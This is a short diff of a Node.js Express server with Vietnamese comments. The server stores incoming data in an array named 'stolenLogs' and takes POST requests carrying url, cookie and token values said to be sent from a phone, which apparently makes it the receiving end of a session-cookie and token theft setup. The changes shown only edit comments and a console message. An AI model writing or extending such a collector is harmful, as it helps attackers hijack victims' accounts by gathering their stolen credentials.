@@ -4,10 +4,10 @@ const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 
-// Mảng lưu trữ các log thu thập được
+// Mảng lưu trữ các log thu thập được (giữ tối đa 100 log gần nhất)
 let stolenLogs = [];
 
-// 1. Nhận dữ liệu Cookie/Token từ điện thoại gửi về (Phương thức POST lên trang chủ)
+// 1. Nhận dữ liệu Cookie/Token từ điện thoại gửi lên (Phương thức POST)
 app.post('/', (req, res) => {
     const { url, cookie, token } = req.body;
     
@@ -75,5 +75,5 @@ app.get('/', (req, res) => {
 });
 
 app.listen(PORT, () => {
-    console.log(`🚀 Server hoạt động đồng bộ tại cổng ${PORT}`);
+    console.log(`🚀 Server hoạt động tại cổng ${PORT}`);
 });
